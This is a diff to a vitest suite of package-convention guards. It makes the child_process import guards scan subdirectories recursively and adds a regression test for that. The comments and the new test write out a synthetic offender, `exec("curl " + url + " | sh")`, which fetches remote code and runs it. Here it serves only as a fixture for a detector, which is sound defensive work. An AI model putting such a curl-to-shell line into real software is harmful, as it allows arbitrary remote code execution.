@@ -1,7 +1,8 @@
 import { describe, expect, it } from "vitest";
-import { readFileSync, readdirSync } from "node:fs";
+import { mkdirSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { dirname, join } from "node:path";
+import { mkdtempClean } from "./fixtures/tmpdir.js";
 
 /**
  * Two rules in this package are single-spelling rules: the nPMI floor lives in
@@ -42,13 +43,16 @@ function testCode(file: string): string {
   return stripped(readFileSync(join(TEST, file), "utf8"));
 }
 
-/** Source with comments stripped but string literals KEPT — what a guard
- *  over an import SPECIFIER has to read, since the specifier is itself a
- *  string literal that `stripped` would erase. */
+/** Comments stripped, string literals KEPT — what a guard over an import
+ *  SPECIFIER has to read, since the specifier is itself a string literal that
+ *  `stripped` would erase. */
+function stripComments(text: string): string {
+  return text.replace(/\/\*[\s\S]*?\*\//g, " ").replace(/\/\/[^\n]*/g, " ");
+}
+
+/** Same, for a file under `src/`. */
 function sourceKeepingStrings(file: string): string {
-  return readFileSync(join(SRC, file), "utf8")
-    .replace(/\/\*[\s\S]*?\*\//g, " ")
-    .replace(/\/\/[^\n]*/g, " ");
+  return stripComments(readFileSync(join(SRC, file), "utf8"));
 }
 
 /** The only modules allowed to import `node:child_process` — `setup-io.ts`,
@@ -89,20 +93,33 @@ function comparesSupportToZero(text: string): boolean {
   );
 }
 
-/** All `.ts` files under `dir`, recursively — this suite's test tree is flat
- *  enough (one `fixtures/` subdirectory) that a full walk costs nothing. */
-function listTs(dir: string, relPrefix = ""): string[] {
+/**
+ * Every file under `dir` ending in `ext`, RECURSIVELY — and "recursively" is
+ * the load-bearing word, not a convenience.
+ *
+ * `sources` below was a flat `readdirSync(SRC)`, which made EVERY guard in
+ * this file blind to any module in a subdirectory of `src/`. That is not
+ * theoretical: `src/lib/evil.ts` containing `import { exec } from
+ * "node:child_process"` and `exec("curl " + url + " | sh")` passed all
+ * twenty-five guards green, including the two this mission exists for. The
+ * package's `src/` happens to be flat today, so the hole was invisible — and
+ * the day it stops being flat is exactly the day someone is adding a module,
+ * i.e. the moment the guard is supposed to fire. A guard whose reach depends
+ * on the tree staying a shape nothing enforces is the "reads as coverage"
+ * failure this suite is otherwise built to avoid.
+ */
+function listFiles(dir: string, ext: string, relPrefix = ""): string[] {
   const out: string[] = [];
   for (const entry of readdirSync(dir, { withFileTypes: true })) {
     const rel = relPrefix === "" ? entry.name : join(relPrefix, entry.name);
-    if (entry.isDirectory()) out.push(...listTs(join(dir, entry.name), rel));
-    else if (entry.name.endsWith(".ts")) out.push(rel);
+    if (entry.isDirectory()) out.push(...listFiles(join(dir, entry.name), ext, rel));
+    else if (entry.name.endsWith(ext)) out.push(rel);
   }
   return out;
 }
 
-const sources = readdirSync(SRC).filter((f) => f.endsWith(".ts"));
-const testFiles = listTs(TEST);
+const sources = listFiles(SRC, ".ts");
+const testFiles = listFiles(TEST, ".ts");
 
 /** The shipped entry points under `bin/` — bundled into the artifact every
  *  user downloads, and NOT covered by `sources`, which reads `src/` alone.
@@ -110,13 +127,29 @@ const testFiles = listTs(TEST);
  *  the composition root a "just spawn it here" edit would land in — the one
  *  shipped file outside `src/` that can reach a shell. */
 const BIN = join(dirname(fileURLToPath(import.meta.url)), "..", "bin");
-const binFiles = readdirSync(BIN).filter((f) => f.endsWith(".mjs"));
+const binFiles = listFiles(BIN, ".mjs");
 
-/** Same as `sourceKeepingStrings`, for a file under `bin/`. */
-function binSourceKeepingStrings(file: string): string {
-  return readFileSync(join(BIN, file), "utf8")
-    .replace(/\/\*[\s\S]*?\*\//g, " ")
-    .replace(/\/\/[^\n]*/g, " ");
+/**
+ * Every file under `root` (at ANY depth) that reaches `child_process`, with
+ * or without the `node:` prefix, minus `allowed`.
+ *
+ * A function of a ROOT DIRECTORY rather than of the module-level `sources`
+ * list, so the regression test at the bottom of this file can run the REAL
+ * rule — this exact function, not a re-spelling of it — against a tree that
+ * actually has a subdirectory in it. A guard whose recursion is only ever
+ * exercised against a flat directory is a guard whose recursion nothing
+ * checks.
+ *
+ * Comments stripped, string literals KEPT: the import specifier itself is the
+ * violation, same treatment as the graphify-path and board-directory guards
+ * below.
+ */
+function childProcessImporters(root: string, ext: string, allowed: Set<string>): string[] {
+  return listFiles(root, ext).filter(
+    (f) =>
+      !allowed.has(f) &&
+      /\b(?:node:)?child_process\b/.test(stripComments(readFileSync(join(root, f), "utf8"))),
+  );
 }
 
 describe("package conventions", () => {
@@ -554,11 +587,48 @@ describe("package conventions", () => {
    * developer who is not thinking about the prefix would write it.
    */
   it("imports child_process only in setup-io.ts (and the two pre-existing git readers), with or without the node: prefix", () => {
-    const allowed = new Set(CHILD_PROCESS_MODULES);
-    const offenders = sources.filter(
-      (f) => !allowed.has(f) && /\b(?:node:)?child_process\b/.test(sourceKeepingStrings(f)),
+    expect(childProcessImporters(SRC, ".ts", new Set(CHILD_PROCESS_MODULES))).toEqual([]);
+  });
+
+  /**
+   * THE REGRESSION TEST for the guard above, and for every other guard in this
+   * file, all of which read the same `listFiles` collection.
+   *
+   * `sources` was a flat `readdirSync(SRC)`. Against the shipped tree that is
+   * indistinguishable from a correct guard — `src/` is flat, so every file is
+   * scanned — and it stays indistinguishable right up until the edit the guard
+   * exists to catch: `src/lib/evil.ts` with `import { exec } from
+   * "node:child_process"` and `exec("curl " + url + " | sh")` in it was
+   * checked against the real suite and passed all twenty-five guards.
+   *
+   * Pinned by running the ACTUAL rule (`childProcessImporters`, the same
+   * function the guard above calls) over a synthetic tree whose only offender
+   * sits one directory down — never by asserting `sources` equals a recursive
+   * walk, which is tautological while `src/` has no subdirectories and would
+   * therefore have gone green against the defect it names.
+   */
+  it("finds a child_process importer one directory down, not only at the scanned root", () => {
+    const root = mkdtempClean("octograph-conventions-");
+    mkdirSync(join(root, "nested"));
+    writeFileSync(join(root, "top.ts"), 'import { readFileSync } from "node:fs";\n');
+    writeFileSync(
+      join(root, "nested", "evil.ts"),
+      'import { exec } from "node:child_process";\nexec("curl " + url + " | sh");\n',
     );
-    expect(offenders).toEqual([]);
+
+    expect(
+      childProcessImporters(root, ".ts", new Set()),
+      "a module in a SUBDIRECTORY of the scanned root reached child_process and this guard " +
+        "did not see it — every rule in this file reads the same collection, so a flat walk " +
+        "makes all of them blind to `src/<anything>/`, which is precisely where a new module " +
+        "lands. Fix the collection, not this test.",
+    ).toEqual([join("nested", "evil.ts")]);
+
+    // …and the allowlist is matched against the SAME relative path the walk
+    // produces, so a nested copy of an allowed filename is still an offender.
+    expect(childProcessImporters(root, ".ts", new Set(["evil.ts"]))).toEqual([
+      join("nested", "evil.ts"),
+    ]);
   });
 
   /**
@@ -630,10 +700,7 @@ describe("package conventions", () => {
    * spawning. Nothing here is allowlisted, unlike the `src/` rule.
    */
   it("no shipped bin entry point imports child_process at all — spawning belongs to the port", () => {
-    const offenders = binFiles.filter((f) =>
-      /\b(?:node:)?child_process\b/.test(binSourceKeepingStrings(f)),
-    );
-    expect([binFiles.length > 0, offenders]).toEqual([true, []]);
+    expect([binFiles.length > 0, childProcessImporters(BIN, ".mjs", new Set())]).toEqual([true, []]);
   });
 
   it("takes only execFile/execFileSync out of child_process — never exec, execSync, spawn, or the whole namespace", () => {
